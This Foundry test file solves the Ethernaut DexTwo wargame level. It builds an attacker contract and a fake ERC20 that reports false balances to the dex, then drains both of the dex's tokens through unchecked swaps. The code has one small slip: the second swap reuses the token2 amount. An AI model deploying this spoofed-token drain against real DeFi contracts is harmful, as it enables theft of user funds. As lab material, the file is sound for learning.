// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {DexTwo} from "../../src/ethernaut/23_DexTwo/DexTwo.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwo_Attacker {
	address player;
	DexTwo dex;
	FakeToken fakeToken;
	
	constructor(DexTwo coreInst_) payable {
		player = msg.sender;
		dex = coreInst_;
		fakeToken = new FakeToken(dex, "FT", "FT", 1_000_000 ether);
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 一次性 掏出 token2
		uint256 amountDexToken2 = IERC20(dex.token2()).balanceOf(address(dex));
		fakeToken.setMagicAmount(amountDexToken2);
		fakeToken.approve(address(dex), amountDexToken2);
		dex.swap(address(fakeToken), address(dex.token2()), amountDexToken2);
		
		printData();
		
		// 一次性 掏出 token1
		uint256 amountDexToken1 = IERC20(dex.token1()).balanceOf(address(dex));
		fakeToken.setMagicAmount(amountDexToken1);
		fakeToken.approve(address(dex), amountDexToken1);
		dex.swap(address(fakeToken), address(dex.token1()), amountDexToken2);
		
		printData();
	}
	
	function printData() public view {
		console.log("IERC20(dex.token1()).balanceOf(address(dex))", IERC20(dex.token1()).balanceOf(address(dex)));
		console.log("IERC20(dex.token2()).balanceOf(address(dex))", IERC20(dex.token2()).balanceOf(address(dex)));
		console.log("IERC20(dex.token1()).balanceOf(address(this))", IERC20(dex.token1()).balanceOf(address(this)));
		console.log("IERC20(dex.token2()).balanceOf(address(this))", IERC20(dex.token2()).balanceOf(address(this)));
		
		console.log("");
	}
}

contract FakeToken is ERC20 {
	DexTwo dex;
	uint256 magicAmount;
	
	constructor(DexTwo dex_, string memory name, string memory symbol, uint256 initialSupply)
	ERC20(name, symbol)
	{
		_mint(msg.sender, initialSupply);
		dex = dex_;
	}
	
	function setMagicAmount(uint256 amount) public {
		magicAmount = amount;
	}
	
	function balanceOf(address account) public view override virtual returns (uint256) {
		if (account == address(dex)) {
			return magicAmount;
		}
		return super.balanceOf(account);
	}
}

